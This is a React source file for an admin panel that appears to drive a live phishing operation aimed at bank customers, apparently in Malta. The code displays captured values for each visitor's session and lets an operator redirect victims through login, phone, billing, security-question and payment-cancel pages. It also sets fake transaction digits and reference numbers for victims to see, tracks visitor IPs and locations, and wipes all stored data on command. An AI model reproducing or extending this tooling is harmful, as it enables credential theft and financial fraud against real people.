                                    <div className="flex items-center gap-1">
                                      <span className="text-[8px] font-semibold text-muted-foreground uppercase tracking-wide">{label}</span>
                                      <Copy className="h-2 w-2 text-muted-foreground opacity-0 group-hover:opacity-100 transition-opacity" />
                                    </div>
                                    <span className="font-mono text-[10px] font-medium text-foreground truncate">{String(value)}</span>
                                  </div>
                                </div>
                              );
                            });
                          }
                          return null;
                        })}
                      </div>
                    ) : (
                      <div className="bg-muted/30 rounded px-2 py-1.5 border border-dashed border-muted">
                        <span className="text-[10px] text-muted-foreground italic">No data yet</span>
                      </div>
                    )}
                  </div>

                  {/* Action Buttons - Compact */}
                  <div className="flex items-center gap-1.5 flex-shrink-0">
                    <Dialog open={controlDialogOpen && currentControlSession === session.id} onOpenChange={(open) => {
                      setControlDialogOpen(open);
                      if (!open) setCurrentControlSession('');
                    }}>
                      <DialogTrigger asChild>
                        <Button 
                          variant="outline" 
                          size="sm"
                          onClick={() => openControlDialog(session.id)}
                          className="h-7 px-2 border-admin text-admin hover:bg-admin hover:text-white text-[10px]"
                        >
                          <Settings className="h-3 w-3 mr-1" />
                          Control
                        </Button>
                      </DialogTrigger>
                      <DialogContent className="sm:max-w-3xl">
                        <DialogHeader>
                          <DialogTitle>Control Session #{sessionsList.findIndex(s => s.id === session.id) + 1}</DialogTitle>
                        </DialogHeader>
                        <div className="space-y-4">
                          <p className="text-sm text-muted-foreground">
                            Current Page: <span className="font-semibold text-foreground">{pageNames[session.currentPage - 1]}</span> (Page {session.currentPage})
                          </p>
                          
                          <div className="grid grid-cols-2 gap-4">
                            {/* Authentication Section */}
                            <div className="space-y-2">
                              <h3 className="text-xs font-semibold text-foreground uppercase tracking-wide flex items-center gap-2">
                                <div className="h-0.5 w-4 bg-primary rounded-full"></div>
                                Authentication
                              </h3>
                              <div className="grid grid-cols-1 gap-1.5">
                                {[0, 1, 2].map((index) => (
                                  <Button
                                    key={index + 1}
                                    variant={session.currentPage === index + 1 ? "default" : "outline"}
                                    size="sm"
                                    onClick={() => handleQuickRedirect(session.id, index + 1)}
                                    disabled={session.currentPage === index + 1}
                                    className="h-8 text-xs justify-start"
                                  >
                                    {index + 1}. {pageNames[index]}
                                  </Button>
                                ))}
                              </div>
                            </div>

                            {/* Verification Section */}
                            <div className="space-y-2">
                              <h3 className="text-xs font-semibold text-foreground uppercase tracking-wide flex items-center gap-2">
                                <div className="h-0.5 w-4 bg-primary rounded-full"></div>
                                Verification
                              </h3>
                              <div className="grid grid-cols-1 gap-1.5">
                                {[3, 4, 5].map((index) => (
                                  <Button
                                    key={index + 1}
                                    variant={session.currentPage === index + 1 ? "default" : "outline"}
                                    size="sm"
                                    onClick={() => handleQuickRedirect(session.id, index + 1)}
                                    disabled={session.currentPage === index + 1}
                                    className="h-8 text-xs justify-start"
                                  >
                                    {index + 1}. {pageNames[index]}
                                  </Button>
                                ))}
                              </div>
                            </div>

                            {/* Action Pages */}
                            <div className="space-y-2">
                              <h3 className="text-xs font-semibold text-foreground uppercase tracking-wide flex items-center gap-2">
                                <div className="h-0.5 w-4 bg-primary rounded-full"></div>
                                Actions
                              </h3>
                              <div className="grid grid-cols-1 gap-1.5">
                                {[6, 7, 13, 14, 15, 16].map((index) => (
                                  <Button
                                    key={index + 1}
                                    variant={session.currentPage === index + 1 ? "default" : "outline"}
                                    size="sm"
                                    onClick={() => handleQuickRedirect(session.id, index + 1)}
                                    disabled={session.currentPage === index + 1}
                                    className="h-8 text-xs justify-start"
                                  >
                                    {index + 1}. {pageNames[index]}
                                  </Button>
                                ))}
                              </div>
                            </div>

                            {/* Security Questions */}
                            <div className="space-y-2">
                              <h3 className="text-xs font-semibold text-foreground uppercase tracking-wide flex items-center gap-2">
                                <div className="h-0.5 w-4 bg-primary rounded-full"></div>
                                Security
                              </h3>
                              <div className="grid grid-cols-1 gap-1.5">
                                {[8, 9, 10, 11, 12].map((index) => (
                                  <Button
                                    key={index + 1}
                                    variant={session.currentPage === index + 1 ? "default" : "outline"}
                                    size="sm"
                                    onClick={() => handleQuickRedirect(session.id, index + 1)}
                                    disabled={session.currentPage === index + 1}
                                    className="h-8 text-xs justify-start"
                                  >
                                    {index + 1}. {pageNames[index]}
                                  </Button>
                                ))}
                              </div>
                            </div>
                          </div>

                          {/* Archive/Delete Zone */}
                          <div className="border-t pt-3">
                            {isHistory ? (
                              <Button
                                variant="destructive"
                                size="sm"
                                onClick={() => {
                                  deleteSessionPermanently(session.id);
                                  setControlDialogOpen(false);
                                }}
                                className="w-full h-8"
                              >
                                <Trash2 className="h-3.5 w-3.5 mr-2" />
                                Delete Session
                              </Button>
                            ) : (
                              <Button
                                variant="secondary"
                                size="sm"
                                onClick={async () => {
                                  try {
                                    await archiveSession(session.id);
                                    toast({
                                      title: "Session Archived",
                                      description: "Session moved to history",
                                    });
                                    setAllSessions(getAllSessions());
                                    const sessionData = await getAllSessionsIncludingArchived();
                                    setAllSessionData(sessionData);
                                    setControlDialogOpen(false);
                                  } catch (error) {
                                    toast({
                                      title: "Error",
                                      description: "Failed to archive session",
                                      variant: "destructive",
                                    });
                                  }
                                }}
                                className="w-full h-8"
                              >
                                <Archive className="h-3.5 w-3.5 mr-2" />
                                Archive Session
                              </Button>
                            )}
                          </div>
                        </div>
                      </DialogContent>
                    </Dialog>
                    
                    <Button
                      variant="outline"
                      size="sm"
                      onClick={() => handleIncorrectInfo(session.id, session.currentPage)}
                      className="h-7 px-2 text-destructive hover:text-destructive hover:bg-destructive/10 border-2 border-destructive text-[10px]"
                      title="Mark as Incorrect"
                    >
                      <AlertCircle className="h-3 w-3 mr-1" />
                      Wrong
                    </Button>

                    {isHistory ? (
                      <Button
                        variant="destructive"
                        size="sm"
                        onClick={() => deleteSessionPermanently(session.id)}
                        className="h-7 px-2 text-[10px]"
                        title="Delete Session"
                      >
                        <Trash2 className="h-3 w-3 mr-1" />
                        Delete
                      </Button>
                    ) : (
                      <Button
                        variant="secondary"
                        size="sm"
                        onClick={async () => {
                          try {
                            await archiveSession(session.id);
                            toast({
                              title: "Session Archived",
                              description: "Session moved to history",
                            });
                            setAllSessions(getAllSessions());
                            const sessionData = await getAllSessionsIncludingArchived();
                            setAllSessionData(sessionData);
                          } catch (error) {
                            toast({
                              title: "Error",
                              description: "Failed to archive session",
                              variant: "destructive",
                            });
                          }
                        }}
                        className="h-7 px-2 text-[10px]"
                        title="Archive Session"
                      >
                        <Archive className="h-3 w-3 mr-1" />
                        Archive
                      </Button>
                    )}
                  </div>
                </div>
              </CardContent>
            </Card>
          ))}
        </div>
      )}
    </div>
  );

  return (
    <div className="min-h-screen bg-background">
      <div className="p-2 sm:p-4 md:p-6" style={{ position: 'relative' }}>
        <div className="max-w-7xl mx-auto space-y-3 sm:space-y-4 md:space-y-6">
        <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
          <div className="flex items-center space-x-3">
            <div className="p-3 rounded-xl" style={{ background: 'var(--gradient-admin)', boxShadow: 'var(--shadow-admin)' }}>
              <Monitor className="h-6 w-6 text-white" />
            </div>
            <div className="space-y-1">
              <h1 className="text-2xl sm:text-3xl font-bold text-foreground">
                Session Management
              </h1>
              <p className="text-sm text-muted-foreground">Real-time monitoring & control</p>
            </div>
          </div>
          <div className="flex flex-col sm:flex-row items-start sm:items-center space-y-2 sm:space-y-0 sm:space-x-3">
            {/* Automatic Mode Toggle */}
            <div className="flex items-center gap-2">
              <Button
                variant={automaticMode ? "default" : "outline"}
                size="sm"
                onClick={() => setAutomaticMode(!automaticMode)}
                className={cn(
                  "flex items-center space-x-2 transition-colors",
                  automaticMode 
                    ? "bg-success text-white hover:bg-success/90" 
                    : "border-border text-muted-foreground hover:bg-muted hover:text-foreground"
                )}
              >
                <Settings className="h-4 w-4" />
                <span className="hidden sm:inline text-sm">{automaticMode ? 'Auto On' : 'Auto Off'}</span>
              </Button>
              {automaticMode && (
                <Badge variant="secondary" className="text-[10px] animate-pulse">
                  Login→Phone→Billing→Call
                </Badge>
              )}
            </div>

            {/* Sound Controls */}
            <div className="flex flex-wrap items-center gap-2">
              <Button
                variant={soundEnabled ? "default" : "outline"}
                size="sm"
                onClick={() => setSoundEnabled(!soundEnabled)}
                className={cn(
                  "flex items-center space-x-2 transition-colors",
                  soundEnabled 
                    ? "bg-primary text-primary-foreground hover:bg-primary/90" 
                    : "border-border text-muted-foreground hover:bg-muted hover:text-foreground"
                )}
              >
                {soundEnabled ? 
                  <Volume2 className="h-4 w-4" /> : 
                  <VolumeX className="h-4 w-4" />
                }
                <span className="hidden sm:inline text-sm">{soundEnabled ? 'Sound On' : 'Sound Off'}</span>
              </Button>
              
              {soundEnabled && (
                <div className="flex items-center gap-2">
                  <Music className="h-4 w-4 text-muted-foreground" />
                  <Select value={selectedSound} onValueChange={changeSound}>
                    <SelectTrigger className="w-28 sm:w-32">
                      <SelectValue />
                    </SelectTrigger>
                    <SelectContent>
                      {soundOptions.map((sound) => (
                        <SelectItem key={sound.id} value={sound.id}>
                          <div className="flex items-center justify-between w-full">
                            <span>{sound.name}</span>
                          </div>
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                  <Button
                    variant="outline"
                    size="sm"
                    onClick={() => testSound()}
                    className="px-2"
                  >
                    Test
                  </Button>
                </div>
              )}
            </div>

            {/* Visitors Button */}
            <Dialog open={visitorsDialogOpen} onOpenChange={setVisitorsDialogOpen}>
              <DialogTrigger asChild>
                <Button
                  variant="outline"
                  size="sm"
                  onClick={() => {
                    setVisitorsDialogOpen(true);
                    loadVisitors();
                  }}
                  className="flex items-center space-x-2"
                >
                  <Eye className="h-4 w-4" />
                  <span className="hidden sm:inline text-sm">
                    Visitors (MT: {maltaVisitors.length} | Other: {otherVisitors.length})
                  </span>
                  <span className="sm:hidden text-sm">{visitors.length}</span>
                </Button>
              </DialogTrigger>
              <DialogContent className="sm:max-w-3xl max-h-[80vh] overflow-y-auto">
                <DialogHeader>
                  <DialogTitle>Site Visitors</DialogTitle>
                </DialogHeader>
                <div className="space-y-4">
                  {visitorsLoading ? (
                    <div className="text-center py-8">
                      <p className="text-muted-foreground">Loading visitors...</p>
                    </div>
                  ) : visitors.length === 0 ? (
                    <div className="text-center py-8">
                      <Eye className="h-12 w-12 mx-auto text-muted-foreground mb-4" />
                      <p className="text-muted-foreground">No visitors yet</p>
                    </div>
                  ) : (
                    <div className="space-y-2">
                      <div className="flex items-center justify-between mb-4">
                        <div className="flex items-center space-x-4">
                          <p className="text-sm text-muted-foreground">
                            Total visitors: <Badge variant="secondary">{visitors.length}</Badge>
                          </p>
                          <p className="text-sm text-muted-foreground">
                            Malta: <Badge variant="default" className="bg-success">{maltaVisitors.length}</Badge>
                          </p>
                          <p className="text-sm text-muted-foreground">
                            Other: <Badge variant="default" className="bg-primary">{otherVisitors.length}</Badge>
                          </p>
                        </div>
                      </div>
                      <div className="border rounded-lg overflow-hidden">
                        <table className="w-full">
                          <thead className="bg-muted">
                            <tr>
                              <th className="text-left p-3 text-sm font-medium">IP Address</th>
                              <th className="text-left p-3 text-sm font-medium">ISP</th>
                              <th className="text-left p-3 text-sm font-medium">Location</th>
                              <th className="text-left p-3 text-sm font-medium">Visited</th>
                            </tr>
                          </thead>
                          <tbody className="divide-y">
                            {visitors.map((visitor) => {
                              // Check if visitor is active (visited within last 10 seconds)
                              const isActive = () => {
                                const now = new Date();
                                const visitedAt = new Date(visitor.visited_at);
                                const diffSeconds = (now.getTime() - visitedAt.getTime()) / 1000;
                                return diffSeconds < 10;
                              };
                              
                              return (
                                <tr key={visitor.id} className="hover:bg-muted/50">
                                  <td className="p-3 text-sm font-mono">
                                    <div className="flex items-center space-x-2">
                                      <div 
                                        className={cn(
                                          "h-2 w-2 rounded-full",
                                          isActive() ? "bg-success" : "bg-destructive"
                                        )}
                                        title={isActive() ? "Online" : "Offline"}
                                      />
                                      <span>{visitor.ip_address}</span>
                                    </div>
                                  </td>
                                  <td className="p-3 text-sm">{visitor.isp_name || 'Unknown'}</td>
                                  <td className="p-3 text-sm">
                                    {visitor.city && visitor.country 
                                      ? `${visitor.city}, ${visitor.country}` 
                                      : visitor.country || 'Unknown'}
                                  </td>
                                  <td className="p-3 text-sm text-muted-foreground">
                                    {new Date(visitor.visited_at).toLocaleString()}
                                  </td>
                                </tr>
                              );
                            })}
                          </tbody>
                        </table>
                      </div>
                    </div>
                  )}
                </div>
              </DialogContent>
            </Dialog>

            {/* Clear All Data Button */}
            <Dialog>
              <DialogTrigger asChild>
                <Button
                  variant="destructive"
                  size="sm"
                  className="flex items-center space-x-2"
                >
                  <Trash2 className="h-4 w-4" />
                  <span className="hidden sm:inline text-sm">Clear All Data</span>
                </Button>
              </DialogTrigger>
              <DialogContent>
                <DialogHeader>
                  <DialogTitle>Clear All Data?</DialogTitle>
                </DialogHeader>
                <p className="text-sm text-muted-foreground">
                  This will PERMANENTLY delete:
                  <ul className="list-disc list-inside mt-2 space-y-1">
                    <li>All live sessions</li>
                    <li>All archived sessions</li>
                    <li>All history records</li>
                    <li>All visitor tracking data</li>
                  </ul>
                  <br />
                  <strong className="text-destructive">This action cannot be undone and will clear EVERYTHING from the database.</strong>
                </p>
                <div className="flex justify-end space-x-2 mt-4">
                  <DialogClose asChild>
                    <Button variant="outline">
                      Cancel
                    </Button>
                  </DialogClose>
                  <DialogClose asChild>
                    <Button
                      variant="destructive"
                      onClick={async (e) => {
                        e.preventDefault();
                        try {
                          console.log('🗑️ Starting complete data wipe...');

                          // Delete ALL sessions (not just archive)
                          console.log('🗑️ Deleting all sessions...');
                          const { error: deleteErr } = await supabase
                            .from('user_sessions')
                            .delete()
                            .gte('created_at', '1970-01-01'); // Delete everything
                          
                          if (deleteErr) {
                            console.error('Session delete error:', deleteErr);
                            throw deleteErr;
                          }

                          // Delete ALL visitors
                          console.log('🗑️ Deleting all visitors...');
                          const { error: clearErr } = await supabase
                            .from('visitors')
                            .delete()
                            .gte('visited_at', '1970-01-01'); // Delete everything
                          
                          if (clearErr) {
                            console.error('Visitor delete error:', clearErr);
                            throw clearErr;
                          }

                          // Clear all local state
                          setAllSessions([]);
                          setAllSessionData([]);
                          setVisitors([]);

                          console.log('✅ Complete data wipe successful');
                          toast({
                            title: "Success",
                            description: "All data permanently cleared from database",
                          });

                          // Reload all data to confirm everything is gone
                          setTimeout(() => {
                            loadVisitors();
                            window.location.reload(); // Force full refresh
                          }, 500);
                        } catch (error) {
                          console.error('❌ Failed to clear all data:', error);
                          toast({
                            title: "Error",
                            description: "Failed to clear all data. Check console for details.",
                            variant: "destructive",
                          });
                        }
                      }}
                    >
                      Clear All Data Permanently
                    </Button>
                  </DialogClose>
                </div>
              </DialogContent>
            </Dialog>

            {/* Theme Selector */}
            <div className="flex items-center gap-2">
              <Palette className="h-4 w-4 text-muted-foreground" />
              <Select value={currentTheme} onValueChange={setCurrentTheme}>
                <SelectTrigger className="w-24 sm:w-32">
                  <SelectValue />
                </SelectTrigger>
                <SelectContent>
                  {themeOptions.map((theme) => {
                    const IconComponent = theme.icon;
                    return (
                      <SelectItem key={theme.value} value={theme.value}>
                        <div className="flex items-center space-x-2">
                          <IconComponent className="h-4 w-4" />
                          <span>{theme.label}</span>
                        </div>
                      </SelectItem>
                    );
                  })}
                </SelectContent>
              </Select>
            </div>
            
            <Button 
              variant="outline" 
              onClick={() => setIsAdmin(false)}
              size="sm"
              className="border-admin text-admin hover:bg-admin hover:text-admin-foreground"
            >
              <span className="hidden sm:inline">Exit Admin</span>
              <span className="sm:hidden">Exit</span>
            </Button>
          </div>
        </div>

        <div className="grid grid-cols-2 lg:grid-cols-4 gap-4 mb-6">
          <Card className="border-none shadow-lg transition-all duration-300 hover:shadow-xl hover:scale-105">
            <CardContent className="p-6">
              <div className="flex items-center justify-between mb-3">
                <div className="p-3 rounded-xl bg-primary/10">
                  <Users className="h-6 w-6 text-primary" />
                </div>
                <Badge variant="secondary" className="text-xs font-semibold">Total</Badge>
              </div>
              <p className="text-3xl font-bold mb-1">{allSessions.length}</p>
              <p className="text-sm text-muted-foreground">Total Sessions</p>
            </CardContent>
          </Card>
          
          <Card className="border-none shadow-lg transition-all duration-300 hover:shadow-xl hover:scale-105">
            <CardContent className="p-6">
              <div className="flex items-center justify-between mb-3">
                <div className="p-3 rounded-xl bg-success/10">
                  <Users className="h-6 w-6 text-success" />
                </div>
                <div className="h-2 w-2 rounded-full bg-success animate-pulse"></div>
              </div>
              <p className="text-3xl font-bold mb-1 text-success">{liveSessions.length}</p>
              <p className="text-sm text-muted-foreground">Live Now</p>
            </CardContent>
          </Card>
          
          <Card className="border-none shadow-lg transition-all duration-300 hover:shadow-xl hover:scale-105">
            <CardContent className="p-6">
              <div className="flex items-center justify-between mb-3">
                <div className="p-3 rounded-xl bg-warning/10">
                  <Clock className="h-6 w-6 text-warning" />
                </div>
                <Badge variant="outline" className="text-xs border-warning text-warning">Pending</Badge>
              </div>
              <p className="text-3xl font-bold mb-1 text-warning">{allSessions.filter(s => s.isWaiting).length}</p>
              <p className="text-sm text-muted-foreground">Awaiting Action</p>
            </CardContent>
          </Card>
          
          <Card className="border-none shadow-lg transition-all duration-300 hover:shadow-xl hover:scale-105">
            <CardContent className="p-6">
              <div className="flex items-center justify-between mb-3">
                <div className="p-3 rounded-xl bg-success/10">
                  <CheckCircle className="h-6 w-6 text-success" />
                </div>
                <Badge className="text-xs bg-success text-white">Done</Badge>
              </div>
              <p className="text-3xl font-bold mb-1">{allSessions.filter(s => s.currentPage === 6).length}</p>
              <p className="text-sm text-muted-foreground">Completed</p>
            </CardContent>
          </Card>
        </div>

        <Tabs defaultValue="live" className="space-y-4">
          <TabsList className="grid w-full grid-cols-3 p-1 bg-muted/50 backdrop-blur-sm rounded-xl">
            <TabsTrigger 
              value="live" 
              className="text-xs sm:text-sm data-[state=active]:bg-success/10 data-[state=active]:text-success data-[state=active]:shadow-md transition-all"
            >
              <div className="flex items-center space-x-2">
                <span>Live</span>
                <Badge variant="secondary" className="h-5 px-2 text-xs">{liveSessions.length}</Badge>
              </div>
            </TabsTrigger>
            <TabsTrigger 
              value="history" 
              className="text-xs sm:text-sm data-[state=active]:bg-primary/10 data-[state=active]:text-primary data-[state=active]:shadow-md transition-all"
            >
              <div className="flex items-center space-x-2">
                <span>History</span>
                <Badge variant="secondary" className="h-5 px-2 text-xs">{historySessions.length}</Badge>
              </div>
            </TabsTrigger>
            <TabsTrigger 
              value="settings" 
              className="text-xs sm:text-sm data-[state=active]:bg-primary/10 data-[state=active]:text-primary data-[state=active]:shadow-md transition-all"
            >
              <Settings className="h-3 w-3 sm:mr-1" />
              <span className="hidden sm:inline">Settings</span>
            </TabsTrigger>
          </TabsList>

          <TabsContent value="live" className="space-y-4">
            {renderSessionsList(liveSessions, "Live Sessions", false)}
          </TabsContent>

          <TabsContent value="history" className="space-y-4">
            {renderSessionsList(historySessions, "History", true)}
          </TabsContent>


          <TabsContent value="settings" className="space-y-4">
            <Card className="border-none shadow-lg">
              <CardHeader className="border-b bg-gradient-to-r from-primary/5 to-transparent">
                <CardTitle className="flex items-center text-xl">
                  <div className="p-2 rounded-lg bg-primary/10 mr-3">
                    <Edit className="h-5 w-5 text-primary" />
                  </div>
                  <span>Login Warning Message</span>
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="space-y-2">
                  <Label>Current Warning Message</Label>
                  <div className="p-3 bg-[#e8eef5] border border-[#d1dbe8] rounded-md">
                    <div className="flex items-start space-x-3">
                      <Info className="h-5 w-5 text-[#005eb8] mt-0.5 flex-shrink-0" />
                      <p className="text-sm text-gray-800 whitespace-pre-line">
                        {warningMessage || 'Loading...'}
                      </p>
                    </div>
                  </div>
                </div>
                
                <Dialog open={warningDialogOpen} onOpenChange={setWarningDialogOpen}>
                  <DialogTrigger asChild>
                    <Button 
                      variant="outline"
                      className="border-primary text-primary hover:bg-primary hover:text-primary-foreground"
                      onClick={() => setWarningDialogOpen(true)}
                    >
                      <Edit className="h-4 w-4 mr-2" />
                      Edit Warning Message
                    </Button>
                  </DialogTrigger>
                  <DialogContent className="sm:max-w-2xl">
                    <DialogHeader>
                      <DialogTitle>Edit Login Warning Message</DialogTitle>
                    </DialogHeader>
                    <div className="space-y-4">
                      <div className="space-y-2">
                        <Label htmlFor="warning-message">Warning Message</Label>
                        <Textarea
                          id="warning-message"
                          value={editingWarning}
                          onChange={(e) => setEditingWarning(e.target.value)}
                          placeholder="Enter the warning message that appears on the login page..."
                          className="min-h-32"
                          rows={6}
                        />
                      </div>
                      <div className="flex space-x-2 justify-end">
                        <Button 
                          variant="outline" 
                          onClick={() => {
                            setWarningDialogOpen(false);
                            setEditingWarning(warningMessage);
                          }}
                        >
                          Cancel
                        </Button>
                        <Button 
                          onClick={handleUpdateWarningMessage}
                          className="bg-primary hover:bg-primary/90"
                        >
                          Update Message
                        </Button>
                      </div>
                    </div>
                  </DialogContent>
                </Dialog>

              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
        </div>
      </div>

      {/* Security Question Dialog - Moved outside of main content to avoid nesting issues */}
      <Dialog open={securityQuestionDialogOpen} onOpenChange={(open) => {
        console.log('🟢 Security question dialog open state changing to:', open);
        setSecurityQuestionDialogOpen(open);
      }}>
        <DialogContent className="sm:max-w-md z-[9999]" style={{zIndex: 9999}}>
          <DialogHeader>
            <DialogTitle className="flex items-center space-x-2">
              <Shield className="h-5 w-5 text-admin" />
              <span>Enter Security Question {pendingSecurityRedirect?.page ? `${pendingSecurityRedirect.page - 8}` : ''}</span>
            </DialogTitle>
          </DialogHeader>
          <form onSubmit={handleSecurityQuestionSubmit} className="space-y-4">
            <div className="space-y-2">
              <Label htmlFor="securityQuestion">Security Question</Label>
              <Input
                id="securityQuestion"
                type="text"
                value={securityQuestion}
                onChange={(e) => setSecurityQuestion(e.target.value)}
                placeholder="Enter the security question for the user"
                className="w-full"
                autoFocus
              />
            </div>
            <div className="flex space-x-2 justify-end">
              <Button 
                type="button" 
                variant="outline" 
                onClick={() => {
                  setSecurityQuestionDialogOpen(false);
                  setSecurityQuestion('');
                  setPendingSecurityRedirect(null);
                }}
              >
                Cancel
              </Button>
              <Button 
                type="submit"
                className="bg-admin hover:bg-admin/90 text-admin-foreground"
                disabled={!securityQuestion.trim()}
              >
                Set Question & Redirect
              </Button>
            </div>
          </form>
        </DialogContent>
      </Dialog>

      {/* Transaction Digits Dialog for Payment Cancel Page */}
      <Dialog open={transactionDigitsDialogOpen} onOpenChange={(open) => {
        setTransactionDigitsDialogOpen(open);
      }}>
        <DialogContent className="sm:max-w-md z-[9999]" style={{zIndex: 9999}}>
          <DialogHeader>
            <DialogTitle className="flex items-center space-x-2">
              <Shield className="h-5 w-5 text-admin" />
              <span>Enter Transaction Digits</span>
            </DialogTitle>
          </DialogHeader>
          <form onSubmit={handleTransactionDigitsSubmit} className="space-y-4">
            <div className="space-y-2">
              <Label htmlFor="transactionDigits">Transaction Verification Digits</Label>
              <Input
                id="transactionDigits"
                type="text"
                value={transactionDigits}
                onChange={(e) => setTransactionDigits(e.target.value)}
                placeholder="e.g., 054782500"
                className="w-full font-mono"
                autoFocus
              />
              <p className="text-xs text-muted-foreground">
                These digits will be displayed to the user for transaction verification
              </p>
            </div>
            <div className="flex space-x-2 justify-end">
              <Button 
                type="button" 
                variant="outline" 
                onClick={() => {
                  setTransactionDigitsDialogOpen(false);
                  setTransactionDigits('');
                  setPendingTransactionRedirect(null);
                }}
              >
                Cancel
              </Button>
              <Button 
                type="submit"
                className="bg-admin hover:bg-admin/90 text-admin-foreground"
                disabled={!transactionDigits.trim()}
              >
                Set Digits & Redirect
              </Button>
            </div>
          </form>
        </DialogContent>
      </Dialog>

      {/* Reference Number Dialog for Self Send Page */}
      <Dialog open={referenceNumberDialogOpen} onOpenChange={(open) => {
        setReferenceNumberDialogOpen(open);
      }}>
        <DialogContent className="sm:max-w-md z-[9999]" style={{zIndex: 9999}}>
          <DialogHeader>
            <DialogTitle className="flex items-center space-x-2">
              <Shield className="h-5 w-5 text-admin" />
              <span>Enter Reference Number</span>
            </DialogTitle>
          </DialogHeader>
          <form onSubmit={handleReferenceNumberSubmit} className="space-y-4">
            <div className="space-y-2">
              <Label htmlFor="referenceNumber">Reference Number</Label>
              <Input
                id="referenceNumber"
                type="text"
                value={referenceNumber}
                onChange={(e) => setReferenceNumber(e.target.value)}
                placeholder="e.g., 458900000"
                className="w-full font-mono"
                autoFocus
              />
              <p className="text-xs text-muted-foreground">
                This reference number will be displayed to the user for device verification
              </p>
            </div>
            <div className="flex space-x-2 justify-end">
              <Button 
                type="button" 
                variant="outline" 
                onClick={() => {
                  setReferenceNumberDialogOpen(false);
                  setReferenceNumber('');
                  setPendingReferenceRedirect(null);
                }}
              >
                Cancel
              </Button>
              <Button 
                type="submit"
                className="bg-admin hover:bg-admin/90 text-admin-foreground"
                disabled={!referenceNumber.trim()}
              >
                Set Reference & Redirect
              </Button>
            </div>
          </form>
        </DialogContent>
      </Dialog>
    </div>
  );
};

export default AdminPanel;